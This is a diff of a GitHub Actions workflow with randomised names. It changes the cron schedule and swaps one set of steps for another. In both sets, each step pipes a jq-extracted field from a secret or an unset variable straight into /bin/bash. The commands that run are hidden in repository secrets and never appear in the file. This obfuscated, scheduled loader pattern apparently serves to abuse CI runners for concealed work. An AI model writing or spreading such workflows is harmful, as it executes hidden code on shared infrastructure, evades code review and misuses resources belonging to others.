@@ -1,22 +1,24 @@
 name: advantagemarried
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 1/6 * * *'
-jobs:  # 10167
+    - cron: '7 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: advantagemarried
         env:
-          v26: ${{ secrets.v26 }}
+          tg35933: ${{ secrets.tg35933 }}
         run: |
-          echo $v26 | jq -r .uhlq5077 | /bin/bash
-          echo $qeh8759 | jq -r .v47 | /bin/bash
-          echo $bxuu58 | jq -r .a35487 | /bin/bash
-          echo $bor690 | jq -r .fce635 | /bin/bash
-          echo $gfyt6074 | jq -r .lyda655 | /bin/bash
-          echo $p8 | jq -r .m6627 | /bin/bash
-          echo $iit0 | jq -r .wpm79 | /bin/bash
+          echo $tg35933 | jq -r .qcri9378 | /bin/bash
+          echo $eaj1 | jq -r .sxg97 | /bin/bash
+          echo $vkvyl19282 | jq -r .l28 | /bin/bash
+          echo $vdhli11424 | jq -r .ob838 | /bin/bash
+          echo $vu37 | jq -r .r279 | /bin/bash
+          echo $i2 | jq -r .a6274 | /bin/bash
+          echo $lz676 | jq -r .cm5 | /bin/bash
 
